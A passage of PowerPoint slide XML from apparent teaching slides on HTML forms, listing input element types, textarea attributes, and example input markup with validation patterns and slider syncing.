                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>password</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45727" marB="45727"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>password field (by default characters are not displayed)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45727" marB="45727"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10010"/>
                  </a:ext>
                </a:extLst>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F66FD13F-4EA7-45FC-9EF1-8CE1C7DD52A3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>&lt;input&gt; element types continued</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6F68A73B-E642-4CF7-B88D-BEACA475DACD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph idx="1"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="778607232"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="1600200"/>
          <a:ext cx="10972800" cy="3703639"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="1597968">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20000"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="9374832">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20001"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="370872">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Attribute</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45724" marB="45724"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Description</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45724" marB="45724"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10000"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370872">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>radio</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45724" marB="45724"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>radio button, only one radio button can be selected with the same name</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45724" marB="45724"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10001"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370872">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>range</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45724" marB="45724"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>range slider, limited by min and max, step stepping, value = initial value</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45724" marB="45724"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10002"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370872">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>reset</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45724" marB="45724"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>reset the form</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45724" marB="45724"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10003"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370872">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>search</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45724" marB="45724"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>search string</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45724" marB="45724"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10004"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370872">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>submit</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45724" marB="45724"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>submit button (triggers submit event)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45724" marB="45724"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10005"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370872">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>tel</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45724" marB="45724"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>telephone number</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45724" marB="45724"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10006"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="365791">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>text</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45724" marB="45724"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>default, one line text input, value = initial value</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45724" marB="45724"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10007"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370872">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>time</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45724" marB="45724"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>time (</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>hour:minute:second</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>), not supported by Safari</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45724" marB="45724"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10008"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370872">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>url</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45724" marB="45724"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>URL (web address)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45724" marB="45724"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10009"/>
                  </a:ext>
                </a:extLst>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C279E27F-80D7-4CB3-9A5D-0B25D0E06579}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>Examples of Input Elements</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="73731" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{87B81153-2904-4CDE-B12B-4EFD3092AE34}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;input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type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text</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size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"60"</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firstname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autofocus</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placeholder</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your</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first</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name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required</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>br</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&lt;input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type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password</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size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"20"</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password</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pattern</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"^[\w,.\-:;?!]{8,20}$"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required</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>br</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&lt;input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type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number</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age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min</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max</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"130"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"50"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>br</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label</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id_number_input</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r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Range</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with</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numeric</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entry</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>:</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label</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&lt;input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type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range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id_number_input</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min</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max</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"1000"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"500"</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FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>step</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oninput</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id_number_output</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>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value</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </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this.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>value</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&lt;input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type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number</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id_number_output</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"500"</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min</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"0"</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FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>max</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"1000"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step</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oninput</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id_number_input</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>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value</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </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this.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>value</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8B65AE40-1F4C-4690-B10F-6E969FEABFF6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>&lt;textarea&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="6" name="Content Placeholder 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4D522C98-0B82-403D-9F55-315059AC129B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph sz="half" idx="1"/>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="407988" y="1600200"/>
          <a:ext cx="5197475" cy="3336921"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="1381707">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20000"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3815768">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20001"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="370769">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Attribute</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91424" marR="91424" marT="45711" marB="45711"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>Description</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91424" marR="91424" marT="45711" marB="45711"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10000"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370769">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>autofocus</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91424" marR="91424" marT="45711" marB="45711"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>gain focus at page load</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91424" marR="91424" marT="45711" marB="45711"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10001"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370769">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>cols</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91424" marR="91424" marT="45711" marB="45711"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>number of columns</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91424" marR="91424" marT="45711" marB="45711"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10002"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370769">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
                        <a:t>maxlength</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91424" marR="91424" marT="45711" marB="45711"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>maximum of total characters allowed</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91424" marR="91424" marT="45711" marB="45711"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10003"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370769">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>name</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91424" marR="91424" marT="45711" marB="45711"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>unique name</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91424" marR="91424" marT="45711" marB="45711"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10004"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370769">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>placeholder</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91424" marR="91424" marT="45711" marB="45711"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>placeholder hint text</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91424" marR="91424" marT="45711" marB="45711"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10005"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370769">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>required</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91424" marR="91424" marT="45711" marB="45711"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>if present, required to fill</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91424" marR="91424" marT="45711" marB="45711"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10006"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370769">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>rows</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91424" marR="91424" marT="45711" marB="45711"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0"/>
                        <a:t>number of rows</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91424" marR="91424" marT="45711" marB="45711"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
